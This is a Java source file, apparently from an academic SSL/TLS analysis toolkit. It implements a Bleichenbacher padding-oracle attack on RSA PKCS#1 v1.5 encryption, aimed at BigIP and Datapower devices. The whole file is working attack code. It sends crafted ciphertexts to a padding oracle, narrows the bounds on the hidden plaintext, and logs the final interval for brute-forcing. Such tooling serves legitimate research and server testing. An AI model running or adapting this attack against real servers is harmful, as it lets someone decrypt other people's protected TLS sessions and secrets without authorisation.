package de.rub.nds.ssl.analyzer.attacker;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.Interval;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
import de.rub.nds.ssl.stack.Utility;
import java.io.BufferedWriter;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import org.apache.log4j.Logger;

/**
 * Bleichenbacher algorithm for BigIP and Datapower
 */
public class BleichenbacherBigIP {

    protected final AOracle oracle;
    //protected final byte[] decryptedMsg;
    protected final byte[] encryptedMsg;
    protected final RSAPublicKey publicKey;
    protected BigInteger c0;
    protected BigInteger s0;
    protected BigInteger si;
    protected Interval[] m;
    protected final int blockSize;
    protected final BigInteger bigB;
    protected final BigInteger big256B;
    protected final boolean msgIsPKCS;
    protected BufferedWriter bw;
    /**
     * Initialize the log4j logger.
     */
    static Logger logger = Logger.getLogger(BleichenbacherBigIP.class);

    public BleichenbacherBigIP(final byte[] msg,
            final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
        this.encryptedMsg = msg.clone();
        this.publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
        this.oracle = pkcsOracle;
        this.msgIsPKCS = msgPKCScofnorm;
        c0 = BigInteger.ZERO;
        si = BigInteger.ZERO;
        m = null;

        this.blockSize = oracle.getBlockSize();

        // b computation
        int tmp = publicKey.getModulus().bitLength();
        while (tmp % Utility.BITS_IN_BYTE != 0) {
            tmp++;
        }
        tmp = ((tmp / Utility.BITS_IN_BYTE) - 2) * Utility.BITS_IN_BYTE;
        bigB = BigInteger.valueOf(2).pow(tmp);
        big256B = bigB.multiply(BigInteger.valueOf(256));
        logger.info("B computed: " + bigB);
        logger.info("Blocksize: " + blockSize + " bytes");
    }

    public void attack() throws OracleException {
        int i = 0;
        c0 = new BigInteger(1, encryptedMsg);

        logger.info("Step 1: Blinding omitted ");
        i++;

        byte[] send;
        boolean pkcsConform;
        BigInteger n = publicKey.getModulus();

        logger.info("Step 2X: Starting the search");

        // max value for q, it should not be larger than n/256B
        int qMax = n.divide(big256B).intValue();
        logger.debug("qmax (n/256B): " + qMax);

        BigInteger lowerBound = bigB.multiply(BigInteger.valueOf(2));
        BigInteger upperBound = bigB.multiply(BigInteger.valueOf(3));

        BigInteger ri = BigInteger.ZERO;

        while (true) {
            for (int q = 0; q < qMax; q++) {
                BigInteger sMin = computeSMin(ri, q, n, upperBound);
                BigInteger sMax = computeSMax(ri, q, n, lowerBound);
                si = sMin;
                while (si.compareTo(sMax) == -1) {
                    si = si.add(BigInteger.ONE);
                    send = prepareMsg(c0, si);
                    // check PKCS#1 conformity
                    pkcsConform = oracle.checkPKCSConformity(send);
                    if (pkcsConform) {
                        lowerBound = computeLowerBound(ri, q, n, lowerBound, upperBound, si);
                        upperBound = computeUpperBound(ri, q, n, lowerBound, upperBound, si);
                        logger.debug("Message: " + Utility.bytesToHex(send));
                        logger.debug("Lower: " + Utility.bytesToHex(lowerBound.toByteArray()));
                        logger.debug("Upper: " + Utility.bytesToHex(upperBound.toByteArray()));

                        ri = upperBound.multiply(si).subtract(bigB).subtract(bigB);
                        ri = ri.divide(n);
                        ri = ri.multiply(BigInteger.valueOf(2));
                        
                        // ok, es funktioniert nicht so toll, daher breche ich hier ab
                        // es ist aber klar, dass das Interval sehr klein wurde und man kann anschliessend
                        // einen Brute-Force Angriff durchführen
                        if ((upperBound.subtract(lowerBound)).compareTo(BigInteger.valueOf(10000)) == -1) {
                            logger.info("Attack finished, the message is in interval: ");
                            logger.info("Lower: " + Utility.bytesToHex(lowerBound.toByteArray()));
                            logger.info("Upper: " + Utility.bytesToHex(upperBound.toByteArray()));
                            logger.info("Number of oracle queries: " + oracle.getNumberOfQueries());
                            return;
                        }
                        if(lowerBound.compareTo(c0) == 1) {
                            throw new RuntimeException("invalid state");
                        }
                        if(upperBound.compareTo(c0) == -1) {
                            throw new RuntimeException("invalid state");
                        }
                    }
                }
            }
            ri = ri.add(BigInteger.ONE);
        }
    }

    private BigInteger computeSMin(BigInteger r, int q, BigInteger n, BigInteger upperBound) {

        BigInteger result = bigB.multiply(BigInteger.valueOf(2));
        result = result.add(n.multiply(r));
        result = result.add(big256B.multiply(BigInteger.valueOf(q)));

        result = result.divide(upperBound);

        return result;
    }

    private BigInteger computeSMax(BigInteger r, int q, BigInteger n, BigInteger lowerBound) {

        BigInteger result = bigB.multiply(BigInteger.valueOf(3));
        result = result.add(n.multiply(r));
        result = result.add(big256B.multiply(BigInteger.valueOf(q)));

        result = result.divide(lowerBound);

        return result;
    }

    private BigInteger computeLowerBound(BigInteger r, int q, BigInteger n,
            BigInteger lowerBound, BigInteger upperBound, BigInteger s) {

        BigInteger result = bigB.multiply(BigInteger.valueOf(2));
        result = result.add(n.multiply(r));
        result = result.add(big256B.multiply(BigInteger.valueOf(q)));

        result = result.divide(s);

        if (result.compareTo(lowerBound) == 1) {
            if (result.compareTo(upperBound) == -1) {
                return result.add(BigInteger.ONE);
            }
        }
        return lowerBound;
    }

    private BigInteger computeUpperBound(BigInteger r, int q, BigInteger n,
            BigInteger lowerBound, BigInteger upperBound, BigInteger s) {

        BigInteger result = bigB.multiply(BigInteger.valueOf(3));
        result = result.add(n.multiply(r));
        result = result.add(big256B.multiply(BigInteger.valueOf(q)));

        result = result.divide(s);

        if (result.compareTo(upperBound) == -1) {
            if (result.compareTo(lowerBound) == 1) {
                return result;
            }
        }
        return upperBound;
    }

    /**
     *
     * @param originalMessage original message to be changed
     * @param si factor
     * @return
     */
    protected byte[] prepareMsg(final BigInteger originalMessage,
            final BigInteger si) {
        byte[] msg;
        BigInteger tmp;

        if (oracle.getNumberOfQueries() % 100 == 0) {
            logger.debug("# of queries so far: " + oracle.
                    getNumberOfQueries());
        }

        // if we use a real oracle (not a plaintext oracle), the si value has
        // to be encrypted first.
        if (!oracle.isPlaintextOracle()) {
            // encrypt: si^e mod n
            tmp = si.modPow(publicKey.getPublicExponent(),
                    publicKey.getModulus());
        } else {
            tmp = si;
        }

        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext oracle)
        tmp = originalMessage.multiply(tmp);
        tmp = tmp.mod(publicKey.getModulus());
        // get bytes
        msg = AttackerUtility.correctSize(tmp.toByteArray(), blockSize, true);

        return msg;
    }

    public BigInteger getSi() {
        return si;
    }
}
